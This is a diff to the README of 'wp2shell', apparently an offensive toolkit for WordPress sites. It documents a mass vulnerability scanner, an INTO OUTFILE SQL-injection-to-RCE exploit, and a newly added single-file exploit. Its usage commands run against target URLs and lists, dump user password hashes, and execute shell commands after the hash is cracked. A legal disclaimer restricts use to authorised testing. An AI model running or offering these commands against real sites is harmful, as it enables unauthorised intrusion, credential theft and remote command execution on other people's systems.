@@ -55,7 +55,7 @@ cd wp2shell
 
 ## 🛠️ Tools Included
 
-### **wp2shell_scanner.py** - Fast Scanner
+### 1️⃣ **wp2shell_scanner.py** - Fast Scanner
 
 Multi-threaded real-time scanner for large-scale vulnerability detection.
 
@@ -69,7 +69,7 @@ python wp2shell_scanner.py -f list.txt -o results.txt --no-sqli-test
 # JSON output
 python wp2shell_scanner.py -f list.txt -j
 ```
-### **wp2shell_intooutfile.py** - INTO OUTFILE Exploit
+### 2️⃣ **wp2shell_intooutfile.py** - INTO OUTFILE Exploit
 
 Demonstrates the INTO OUTFILE RCE variant (requires MySQL FILE privilege).
 
@@ -80,3 +80,27 @@ python3 wp2shell_intooutfile.py https://target.com
 # Multiple targets
 python3 wp2shell_intooutfile.py -f list.txt -t 10
 ```
+
+### 3️⃣ **wp2shell-exploit.py** - Single-File Exploit
+Portable, single-file version of the exploit with full functionality.
+
+```bash
+# Check vulnerability
+python wp2shell-exploit.py check https://target.com
+
+# Read users (extract password hashes)
+python wp2shell-exploit.py read https://target.com --preset users
+
+# Read fingerprint
+python wp2shell-exploit.py read https://target.com --preset fingerprint
+
+# Execute command (after cracking hash)
+python wp2shell-exploit.py shell https://target.com --user admin --password "cracked" --cmd "id"
+```
+
+## ⚠️ Legal Disclaimer
+IMPORTANT: This tool is for educational and authorized testing purposes only.
+- Only use on systems you own or have explicit written permission to test.
+- Unauthorized access to computer systems is illegal.
+- The developers assume no responsibility for misuse of this software.
+Use responsibly and ethically.
